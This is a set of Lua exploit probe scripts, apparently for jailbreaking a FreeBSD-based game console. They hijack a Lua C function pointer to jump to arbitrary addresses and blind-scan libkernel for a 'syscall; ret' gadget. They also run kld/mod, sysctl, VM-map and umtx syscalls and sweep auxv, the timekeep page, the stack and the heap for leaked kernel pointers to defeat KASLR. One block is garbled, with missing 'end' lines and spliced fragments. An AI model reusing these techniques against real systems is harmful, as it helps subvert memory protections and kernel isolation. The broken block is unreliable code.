## probes/phase14_final_push/56g_syscall_gadget.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56g: Find and use syscall;ret gadget in libkernel
--
-- Context: 56e/56f proved reliable CClosure redirect with controlled
-- return values (65us/cycle, 100% reliable). We can dispatch to ANY
-- executable address.
--
-- Goal: Find "syscall; ret" (0F 05 C3) in libkernel's XO .text.
-- Can't read XO pages, but we can CALL through them via CClosure +0x20.
-- Strategy:
--   [A] Get libkernel base and size
--   [B] Try known FreeBSD syscall stub offsets (blind probe)
--       On FreeBSD, the raw __syscall is typically at a small offset.
--       We redirect rawequal to candidate addresses and try calling it
--       with getpid args (syscall 20). If we get our PID back, we found it.
--   [C] Also probe libSceLibcInternal for syscall gadgets
--   [D] Test: can we call make_syscall's underlying C handler directly?
--       The loader must have a C function that does the actual syscall.
--       If we find its address, we can redirect any CClosure to it.

print("=== PROBE 56g: SYSCALL GADGET HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- ============================================================
-- [A] Get module bases
-- ============================================================
print("[A] Module bases")

local function get_module_info(handle)
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc = make_syscall(593)
    local ok = pcall(function() sc(uint64(handle), info) end)
    if not ok then return nil end
    local text_lo = safe_rd(info + 0x108)
    local text_hi = safe_rd(info + 0x10C)
    local text_sz_lo = safe_rd(info + 0x110)
    local text_sz_hi = safe_rd(info + 0x114)
    local data_lo = safe_rd(info + 0x148)
    local data_hi = safe_rd(info + 0x14C)
    return {
        text_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0)),
        text_size = uint64(string.format("0x%X%08X", text_sz_hi or 0, text_sz_lo or 0)),
        data_base = uint64(string.format("0x%X%08X", data_hi or 0, data_lo or 0)),
        text_lo = text_lo, text_hi = text_hi,
        text_sz_lo = text_sz_lo,
    }
end

-- Handle 0 = eboot
local eboot = get_module_info(0)
-- Handle 0x2001 = libkernel (standard handle)
local libkernel = get_module_info(0x2001)

print("  eboot text:     " .. hexval(eboot and eboot.text_base))
print("  eboot text sz:  " .. hexval(eboot and eboot.text_size))
print("  libkernel text: " .. hexval(libkernel and libkernel.text_base))
print("  libkernel text sz: " .. hexval(libkernel and libkernel.text_size))

if not libkernel then
    print("ABORT: can't get libkernel info")
    return
end

local rawequal_addr = parse_func_addr(rawequal)
print("  rawequal:       " .. hexval(rawequal_addr))

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)

-- Get our PID for verification
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  our PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Examine the loader's make_syscall C implementation
-- The syscall.pipe object has a metatable with __call.
-- That __call handler is a C function that does the actual syscall.
-- Find its address and +0x20 target.
-- ============================================================
print("")
print("[B] Loader's syscall dispatch")
local pipe_mt = getmetatable(syscall.pipe)
if pipe_mt then
    print("  pipe metatable found")
    local call_fn = pipe_mt.__call
    if call_fn then
        local call_addr = parse_func_addr(call_fn)
        print("  __call addr: " .. hexval(call_addr))
        if call_addr then
            local call_20 = safe_rq(call_addr + 0x20)
            print("  __call +0x20: " .. hexval(call_20))
            -- This is the C function that implements syscall dispatch!
            -- If we redirect rawequal to this, rawequal becomes a syscall invoker
        end
    else
        print("  no __call in metatable")
        -- Dump metatable contents
        for k, v in pairs(pipe_mt) do
            print("    mt." .. tostring(k) .. " = " .. tostring(v))
        end
    end
else
    print("  no metatable on syscall.pipe")
end

-- Also check: what's in the syscall.pipe object itself?
print("")
print("  syscall.pipe contents:")
local pipe_str = tostring(syscall.pipe)
print("  tostring: " .. pipe_str)
for k, v in pairs(syscall.pipe) do
    if type(k) == "string" then
        print("    ." .. k .. " = " .. tostring(v))
    end
end

-- ============================================================
-- [C] Try to find the C function that does raw syscall
-- Parse the known fields from the pipe object
-- ============================================================
print("")
print("[C] Pipe object deep inspection")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if fn_addr_str then
    print("  fn_addr: " .. fn_addr_str)
    local fn_addr = uint64(fn_addr_str)
    -- Read what fn_addr points to
    local fn_target = safe_rq(fn_addr)
    print("  *fn_addr: " .. hexval(fn_target))
    -- Is this an eboot address? If so, it might be the syscall trampoline
    if fn_target then
        local fh, fl = get_hi_lo(fn_target)
        local eh, el = get_hi_lo(eboot.text_base)
        if fh == eh and fl >= el and fl < el + (eboot.text_sz_lo or 0) then
            print("  -> IN EBOOT .text (offset: 0x" .. string.format("%X", fl - el) .. ")")
        else
            print("  -> NOT in eboot .text")
        end
    end
end
if rop_addr_str then
    print("  rop chain: " .. rop_addr_str)
end

-- ============================================================
-- [D] Blind probe for syscall;ret in libkernel
-- FreeBSD amd64 syscall stubs follow a pattern:
--   mov rax, <syscall_num>  ; 48 C7 C0 XX XX XX XX (or B8 XX XX XX XX)
--   syscall                  ; 0F 05
--   ret                      ; C3
-- Or the raw __syscall helper which just does: syscall; ret
-- Common offsets on FreeBSD: try every 0x10 in first 0x1000
-- We test by redirecting rawequal +0x20 to the candidate and
-- calling it. If it's a syscall;ret, rax determines syscall number.
-- Since rax will be whatever the C caller left, this is risky.
-- Safer: redirect to address, wrap in pcall, check for crash.
-- ============================================================
print("")
print("[D] Blind probe for callable code in libkernel")
local lk_hi, lk_lo = get_hi_lo(libkernel.text_base)
local lk_sz = libkernel.text_sz_lo or 0x48000

-- We know the __call C function on syscall.pipe already does syscalls.
-- Instead of blind probing (risky), let's see if we can redirect
-- rawequal to the pipe's __call C function to gain raw syscall access.
-- The __call function expects: (lua_State* L) -> int
-- When called via rawequal's CClosure, L is passed correctly (same ABI).
-- But __call reads syscall_no from the pipe object's fields, not from
-- our rawequal object. So this won't directly work.
--
-- Better approach: find the actual syscall instruction address in
-- the pipe's __call C function by examining nearby executable code.

-- Let's try a few known offsets for libkernel __syscall
-- On PS4/PS5 FreeBSD, the raw syscall stub is often near the start
local candidates = {}
for off = 0, 0x1000, 0x10 do
    candidates[#candidates + 1] = off
end
-- Also try specific known PS4 offsets
for _, off in ipairs({0xB57, 0xB50, 0xB58, 0xB60, 0xB70, 0xB80}) do
    candidates[#candidates + 1] = off
end

print("  Testing " .. #candidates .. " libkernel offsets via pcall")
print("  (redirecting rawequal, calling with pcall, checking for non-crash)")

-- Use xor eax,eax;ret as our "safe" baseline for comparison
local eboot_hi2, eboot_lo2 = get_hi_lo(eboot.text_base)
local xor_lo = eboot_lo2 + 0x471
local xor_hi = eboot_hi2

local survived = {}
local crashed = {}

for _, off in ipairs(candidates) do
    local addr_lo = lk_lo + off
    local addr_hi = lk_hi
    if addr_lo >= 0x100000000 then
        addr_hi = addr_hi + 1
        addr_lo = addr_lo - 0x100000000
    end

    memory.write_dword(rawequal_addr + 0x20, addr_lo)
    memory.write_dword(rawequal_addr + 0x24, addr_hi)
    local ok, r1 = pcall(rawequal, 1, 1)
    -- Immediately restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)

    if ok then
        survived[#survived + 1] = string.format("0x%04X ok r=%s", off, tostring(r1))
    else
        crashed[#crashed + 1] = string.format("0x%04X err=%s", off, tostring(r1))
    end
end

print("  Survived (" .. #survived .. "):")
for _, s in ipairs(survived) do
    print("    " .. s)
end
print("  Crashed (" .. #crashed .. "):")
for i = 1, math.min(20, #crashed) do
    print("    " .. crashed[i])
end
if #crashed > 20 then
    print("    ... and " .. (#crashed - 20) .. " more")
end

print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

collectgarbage("restart")

print("")
print("=== PROBE 56g COMPLETE ===")
```

## probes/phase14_final_push/56h2_kldsym_kaslr.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56h2: kldsym/modstat KASLR — skip lethal kldstat(308)
--
-- Context: 56h proved kldstat(308) instantly kills the process (like AIO 661).
-- We never reached the other kld/mod syscalls. This probe tests them
-- in order of least-likely-to-crash first.
--
-- Syscalls to test:
--   modfnext(302) — iterate modules, returns int
--   modfind(303) — find module by name, returns int
--   kldfirstmod(309) — first module in kld, returns int
--   kldnext(304) — iterate kld files, returns int
--   modstat(301) — module info struct (may contain addresses)
--   kldsym(337) — symbol lookup (may contain kernel addresses)
--   kldfind(306) — find kld by name (crashed in earlier probes)

print("=== PROBE 56h2: KLDSYM/MODSTAT KASLR (skip lethal kldstat) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

local name_buf = memory.alloc(0x100)
local out_buf = memory.alloc(0x400)

collectgarbage("stop")

-- ============================================================
-- [B] modfnext(302) — int modfnext(int modid)
-- Returns next module ID, 0 = end. Safe (returns int only).
-- ============================================================
print("")
print("[B] modfnext(302) — iterate modules")
local sc_modfnext = make_syscall(302)
local mod_ids = {}
for _, start_id in ipairs({0, 1, 2, 3, -1}) do
    local ok, ret = pcall(function()
        return sc_modfnext(uint64(start_id))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfnext(%d) = %d", start_id, r))
    if r > 0 and start_id == 0 then
        mod_ids[#mod_ids + 1] = r
    end
end

-- Chain from modfnext(0) result
if #mod_ids > 0 then
    local mid = mod_ids[1]
    for i = 1, 20 do
        local ok, ret = pcall(function()
            return sc_modfnext(uint64(mid))
        end)
        local r = -999
        if ok then r = to_num(ret) end
        print(string.format("  modfnext(%d) = %d", mid, r))
        if r <= 0 or r == -999 then break end
        mod_ids[#mod_ids + 1] = r
        mid = r
    end
end
print("  Total modules found: " .. #mod_ids)

-- ============================================================
-- [C] modfind(303) — int modfind(const char *name)
-- Returns module ID. Safe (returns int only).
-- ============================================================
print("")
print("[C] modfind(303) — find module by name")
local sc_modfind = make_syscall(303)

local mod_names = {"kernel", "linuxelf", "linux", "if_lo", "sce_sbl",
    "prison", "vfs", "tmpfs", "nullfs", "devfs"}
for _, mname in ipairs(mod_names) do
    -- Write name string
    for ci = 0, 0x3F do
        local byte = 0
        if ci < #mname then byte = string.byte(mname, ci + 1) end
        safe_wd(name_buf + ci, byte)
    end
    local ok, ret = pcall(function()
        return sc_modfind(uint64(name_buf))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfind('%s') = %d", mname, r))
end

-- ============================================================
-- [D] kldfirstmod(309) — int kldfirstmod(int fileid)
-- Returns first module ID in a kld file. Safe (returns int).
-- ============================================================
print("")
print("[D] kldfirstmod(309)")
local sc_kldfirstmod = make_syscall(309)
for _, fid in ipairs({0, 1, 2, 3, -1}) do
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldfirstmod(%d) = %d", fid, r))
end

-- ============================================================
-- [E] kldnext(304) — int kldnext(int fileid)
-- Iterates kld files. Returns next fileid, 0 = end.
-- ============================================================
print("")
print("[E] kldnext(304) — iterate kld files")
local sc_kldnext = make_syscall(304)
local kld_ids = {}
local fid = 0
for attempt = 1, 15 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldnext(%d) = %d", fid, r))
    if r <= 0 or r == -999 then break end
    kld_ids[#kld_ids + 1] = r
    fid = r
end
print("  Total kld files: " .. #kld_ids)

-- ============================================================
-- [F] modstat(301) — int modstat(int modid, struct module_stat *stat)
-- struct module_stat {
--   int version;          +0x00  (set to sizeof before call)
--   char name[32];        +0x04
--   int refs;             +0x24
--   int id;               +0x28
--   struct module_stat_data { ... }  +0x2C+
-- }
-- May contain kernel addresses in extended fields.
-- ============================================================
print("")
print("[F] modstat(301) — module info (may have kernel addresses)")
local sc_modstat = make_syscall(301)

-- Use module IDs we discovered, plus some guesses
local test_mids = {}
for _, m in ipairs(mod_ids) do test_mids[#test_mids + 1] = m end
if #test_mids == 0 then
    test_mids = {1, 2, 3, 0}
end

for _, mid in ipairs(test_mids) do
    -- Try different struct sizes
    for _, ver in ipairs({0x50, 0x58, 0x60, 0x68, 0x40, 0x30, 0x80, 0x100}) do
        -- Clear buffer
        for i = 0, 0x1FF, 4 do safe_wd(out_buf + i, 0) end
        safe_wd(out_buf, ver)

        local ok, ret = pcall(function()
            return sc_modstat(uint64(mid), uint64(out_buf))
        end)
        local r = -999
        if ok then r = to_num(ret) end

        if r == 0 then
            print(string.format("  *** modstat(%d, ver=0x%X) ret=0", mid, ver))
            -- Read name at +0x04
            local name_str = ""
            for ci = 0, 31 do
                local b = safe_rd(out_buf + 4 + ci)
                if b and b > 0 and b < 128 then
                    name_str = name_str .. string.char(b)
                else
                    break
                end
            end
            if #name_str > 0 then
                print("    name: " .. name_str)
            end
            -- Dump all non-zero qwords
            for off = 0, 0xFF, 8 do
                local val = safe_rq(out_buf + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh ~= 0 or vl ~= 0 then
                        print(string.format("    +0x%02X: %s", off, hexval(val)))
                        if vh >= 0xFFFF8000 then
                            print("      ^^^ KERNEL POINTER!")
                        end
                    end
                end
            end
            break
        elseif r == -999 then
            print(string.format("  modstat(%d, ver=0x%X) CRASHED", mid, ver))
            break
```

```lua
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)

    local slot_addrs = {}

        local val = safe_rq(rop_addr + i)

                            slot_addr = val,
                            slot_val = target_val

        end
        i = i + 8
    end

    print(string.format("  Found %d heap references in chain:", #slot_addrs))
    for _, s in ipairs(slot_addrs) do
        print(string.format("    chain+0x%03X -> %s = %s",
            s.chain_off, hexval(s.slot_addr), hexval(s.slot_val)))
    end

-- ============================================================
-- [F] Direct make_syscall test for kldnext(304)
-- kldnext iterates loaded kernel modules
-- Returns next fileid or 0 for end
-- ============================================================
print("")
print("[F] kldnext(304) — iterate kernel modules")

local sc_kldnext = make_syscall(304)
local fid = 0
for attempt = 1, 10 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldnext(%d) %s", fid,
        r == -999 and "CRASHED" or ("ret=" .. r)))

end

collectgarbage("restart")

print("")
print("=== PROBE 56h COMPLETE ===")
```

## probes/phase14_final_push/56i2_kaslr_auxv_stack.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i2: KASLR hunt — auxv, stack, timekeep, targeted heap scan
--
-- Context: 56i crashed during module data section scan (binary garbage).
-- This probe reorders: high-value targets first, safer scans.

print("=== PROBE 56i2: KASLR — AUXV / STACK / TIMEKEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] sysctl kern.proc.auxv — kernel writes this during execve
-- ============================================================
print("")
print("[B] kern.proc.auxv")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(24)
safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 16)   -- KERN_PROC_AUXV
safe_wd(mib + 12, our_pid)

local auxbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

local ok, ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(auxbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local auxv_ret = ok and to_num(ret) or -999
print("  ret=" .. auxv_ret)

local timekeep_addr = nil

if auxv_ret == 0 then
    local auxlen = safe_rd(oldlenp) or 0
    print("  len=" .. auxlen .. " bytes")

    local i = 0
    while i < auxlen and i < 0x800 do
        local atype_val = safe_rq(auxbuf + i)
        local aval = safe_rq(auxbuf + i + 8)
        if atype_val == nil then break end
        local at = to_num(atype_val)
        if at == 0 then break end

        local tag = ""
        if at == 3 then tag = "AT_PHDR"
        elseif at == 6 then tag = "AT_PAGESZ"
        elseif at == 7 then tag = "AT_BASE"
        elseif at == 9 then tag = "AT_ENTRY"
        elseif at == 15 then tag = "AT_EXECPATH"
        elseif at == 16 then tag = "AT_CANARY"
        elseif at == 18 then tag = "AT_OSRELDATE"
        elseif at == 19 then tag = "AT_NCPUS"
        elseif at == 22 then tag = "AT_TIMEKEEP"
        elseif at == 23 then tag = "AT_STACKPROT"
        elseif at == 25 then tag = "AT_HWCAP"
        end

        local marker = ""
        if is_kptr(aval) then marker = " *** KERNEL PTR! ***" end

        if tag ~= "" or marker ~= "" then
            print(string.format("  [%d] %s = %s%s", at, tag, hexval(aval), marker))
        else
            print(string.format("  [%d] = %s%s", at, hexval(aval), marker))
        end

        if at == 22 then timekeep_addr = aval end
        i = i + 16
    end
else
    print("  auxv not available")
end

-- ============================================================
-- [C] AT_TIMEKEEP shared page scan
-- Kernel maps a shared page with vdso_timehands. Updated by kernel.
-- May contain kernel pointers in the timehands struct.
-- ============================================================
print("")
print("[C] AT_TIMEKEEP shared page")

if timekeep_addr then
    local th, tl = get_hi_lo(timekeep_addr)
    print("  addr: " .. hexval(timekeep_addr))

    -- Dump first 256 bytes as hex
    print("  First 0x100 bytes:")
    local tk_kptrs = 0
    for off = 0, 0xFF, 8 do
        local scan_l = tl + off
        local scan_h = th
        if scan_l >= 0x100000000 then
            scan_h = scan_h + 1
            scan_l = scan_l - 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                local marker = ""
                if is_kptr(val) then
                    marker = " KPTR!"
                    tk_kptrs = tk_kptrs + 1
                end
                print(string.format("    +0x%02X: %s%s", off, hexval(val), marker))
            end
        end
    end

    -- Scan full 16KB page
    for off = 0x100, 0x3FF8, 8 do
        local scan_l = tl + off
        local scan_h = th
        if scan_l >= 0x100000000 then
            scan_h = scan_h + 1
            scan_l = scan_l - 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
        local val = safe_rq(addr)
        if val and is_kptr(val) then
            tk_kptrs = tk_kptrs + 1
            if tk_kptrs <= 10 then
                print(string.format("    +0x%04X: %s KPTR!", off, hexval(val)))
            end
        end
    end
    print("  Total kernel pointers in timekeep page: " .. tk_kptrs)
else
    print("  No timekeep address (auxv failed)")
end

-- ============================================================
-- [D] Stack scan — find stack via VM map, scan top for kernel ptrs
-- ============================================================
print("")
print("[D] Stack scan via sys 674 VM map")

local sc_vmmap = make_syscall(674)
local vm_buf = memory.alloc(0x8000)
local vm_len_buf = memory.alloc(8)
safe_wd(vm_len_buf, 0x8000)
safe_wd(vm_len_buf + 4, 0)

local ok2, ret2 = pcall(function()
    return sc_vmmap(uint64(vm_buf), uint64(vm_len_buf))
end)
local vr = ok2 and to_num(ret2) or -999

if vr == 0 then
    local vm_len = safe_rd(vm_len_buf) or 0
    local entries = math.floor(vm_len / 72)
    print("  " .. entries .. " VM regions")

    local stack_start, stack_end = nil, nil
    for e = 0, entries - 1 do
        local base = vm_buf + e * 72
        local start_val = safe_rq(base)
        local end_val = safe_rq(base + 8)
        -- Read name bytes individually
        local name = ""
        for ci = 0, 15 do
            local b = safe_rd(base + 0x20 + ci)
            if b and b > 31 and b < 127 then
                name = name .. string.char(b)
            elseif b == 0 then
                break
            end
        end
        if name:find("stack") then
            stack_start = start_val
            stack_end = end_val
            print("  Stack: " .. hexval(start_val) .. " - " .. hexval(end_val))
        end
    end

    if stack_end then
        local eh, el = get_hi_lo(stack_end)
        -- Scan top 8KB of stack (most recent frames)
        local scan_bytes = 0x2000
        local stack_kptrs = 0
        print("  Scanning top " .. scan_bytes .. " bytes...")

        for off = scan_bytes, 8, -8 do
            local sl = el - off
            local sh = eh
            if sl < 0 then
                sh = sh - 1
                sl = sl + 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                stack_kptrs = stack_kptrs + 1
                if stack_kptrs <= 10 then
                    print(string.format("    end-0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end
        print("  Stack kernel pointers: " .. stack_kptrs)
    end
else
    print("  VM map ret=" .. vr)
end

-- ============================================================
-- [E] Heap near loader internals — smaller, safer scan
-- Scan 0x1000 bytes around fn_addr and ropchain
-- ============================================================
print("")
print("[E] Heap near loader internals")

local pipe_str = tostring(syscall.pipe)
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if rop_addr_str then
    local rop_addr = uint64(rop_addr_str)
    local rh, rl = get_hi_lo(rop_addr)
    print("  ropchain: " .. hexval(rop_addr))

    local heap_kptrs = 0
    for off = -0x2000, 0x4000, 8 do
        local sl = rl + off
        local sh = rh
        if sl < 0 then
            sh = sh - 1
            sl = sl + 0x100000000
        end
        if sh >= 0 then
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                heap_kptrs = heap_kptrs + 1
                if heap_kptrs <= 10 then
                    print(string.format("    rop%+05X: %s KPTR!", off, hexval(val)))
                end
            end
        end
    end
    print("  Heap kernel pointers: " .. heap_kptrs)
end

-- ============================================================
-- [F] UMTX mutex trylock — check output buffers for kernel addrs
-- ============================================================
print("")
print("[F] UMTX probe")

local sc_umtx = make_syscall(454)
local umtx_obj = memory.alloc(0x100)
local umtx_out = memory.alloc(0x100)

-- Zero
for i = 0, 0xFF, 4 do
    safe_wd(umtx_obj + i, 0)
    safe_wd(umtx_out + i, 0)
end

-- UMTX_OP_MUTEX_TRYLOCK(5)
safe_wd(umtx_obj, 0)
local ok3, ret3 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(5), uint64(0), uint64(0), uint64(0))
end)
print("  MUTEX_TRYLOCK ret=" .. (ok3 and to_num(ret3) or -999))

-- Check if kernel wrote owner TID or wait channel to the mutex obj
local umtx_kptrs = 0
for off = 0, 0x3F, 8 do
    local val = safe_rq(umtx_obj + off)
    if val and is_kptr(val) then
        umtx_kptrs = umtx_kptrs + 1
        print(string.format("    obj+0x%02X: %s KPTR!", off, hexval(val)))
    end
end
-- Dump first 32 bytes of mutex obj to see what kernel wrote
print("  Mutex obj after trylock:")
for off = 0, 0x1F, 8 do
    local val = safe_rq(umtx_obj + off)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then
            print(string.format("    +0x%02X: %s", off, hexval(val)))
        end
    end
end

-- UMTX_OP_NWAKE_PRIVATE(21) — batch wake, different code path
for i = 0, 0x3F, 4 do safe_wd(umtx_out + i, 0) end
local ok4, ret4 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(21), uint64(1), uint64(0), uint64(0))
end)
print("  NWAKE_PRIVATE ret=" .. (ok4 and to_num(ret4) or -999))

collectgarbage("restart")

print("")
print("=== PROBE 56i2 COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW

--   [E] Socket buffer internals — SO_RCVBUF/SO_SNDBUF struct scan
--   [F] kinfo_file via sysctl — file descriptor table (may have kernel vnode ptrs)
--   [G] Process credential struct deeper fields

print("=== PROBE 56i3: KASLR DEEP SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] sys 674 — virtual_query_all with CORRECT 5-arg layout
-- Args: buf, stride=72, max_records, count_ptr, mode=0x40000000
-- ============================================================
print("")
print("[B] sys 674 VM map (correct args)")

local sc674 = make_syscall(674)
local STRIDE = 72
local MAX_RECORDS = 400
local vm_buf = memory.alloc(STRIDE * MAX_RECORDS)
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))

local ok, ret = pcall(function()
    return sc674(uint64(vm_buf), uint64(STRIDE), uint64(MAX_RECORDS),
                  uint64(countp), uint64(0x40000000))
end)
local vm_ret = ok and to_num(ret) or -999
print("  ret=" .. vm_ret)

local stack_start, stack_end = nil, nil
local vm_kptrs = 0

if vm_ret == 0 then
    local count = safe_rd(countp) or 0
    print("  regions: " .. count)
    if count > MAX_RECORDS then count = MAX_RECORDS end

    for e = 0, count - 1 do
        local base = vm_buf + e * STRIDE
        local start_val = safe_rq(base)
        local end_val = safe_rq(base + 8)

        -- Scan ALL 72 bytes for kernel pointers
        for off = 0, 64, 8 do
            local val = safe_rq(base + off)
            if val and is_kptr(val) then
                vm_kptrs = vm_kptrs + 1
                if vm_kptrs <= 15 then
                    print(string.format("  region[%d]+0x%02X: %s KPTR!", e, off, hexval(val)))
                end
            end
        end

        -- Find stack
        local name = ""
        for ci = 0, 15 do
            local b = safe_rd(base + 0x20 + ci)
